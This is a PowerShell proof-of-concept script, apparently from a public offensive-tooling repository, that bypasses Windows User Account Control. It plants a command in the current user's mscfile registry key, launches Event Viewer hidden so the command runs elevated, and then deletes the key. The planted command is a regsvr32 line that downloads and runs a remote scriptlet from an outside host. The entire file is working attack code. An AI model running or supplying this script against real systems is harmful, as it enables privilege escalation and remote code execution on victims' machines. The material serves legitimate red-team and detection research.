<#
.SYNOPSIS
	This script is a proof of concept to bypass the User Access Control (UAC) via Via Eventvwr Registry Key.
	This will bypass Windows UAC by hijacking a special key in the Registry under the current user hive,
	and inserting a custom command that will get invoked when the Windows Event Viewer is launched.
	Work on Windows 7 and 8.1
.NOTES
	Function   : EventVwrBypass
	File Name  : EventVwrBypass.ps1
	Author     : Gushmazuko
	Research   : Matt Nelson - UAC bypass discovery and research
.LINK
	https://github.com/gushmazuko/WinBypass/blob/master/EventVwrBypass.ps1
	Original source: https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-EventVwrBypass.ps1
.EXAMPLE
	Load "regsvr32 -s -n -u -i:http://192.168.0.10/runner.cst scrobj.dll" (By Default used 'arch 64'):
	EventVwrBypass -http "http://192.168.0.10/runner.cst" -arch 64
#>

function EventVwrBypass(){
	Param (

		[Parameter(Mandatory=$True)]
		[String]$http,
		[ValidateSet(64,86)]
		[int]$arch = 64
	)

	$program = "regsvr32 -s -n -u -i:$http scrobj.dll"

	#Create registry structure
	New-Item "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
	Set-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(default)" -Value $program -Force

	#Perform the bypass
	switch($arch)
	{
		64
		{
			#x64 shell in Windows x64 | x86 shell in Windows x86
			Start-Process "C:\Windows\System32\eventvwr.exe" -Window Hidden
		}
		86
		{
			#x86 shell in Windows x64
			C:\Windows\Sysnative\cmd.exe /c "powershell Start-Process C:\Windows\System32\slui.exe -Window Hidden"
		}
	}

	#Remove registry structure
	Start-Sleep 3
	Remove-Item "HKCU:\Software\Classes\mscfile" -Recurse -Force
}
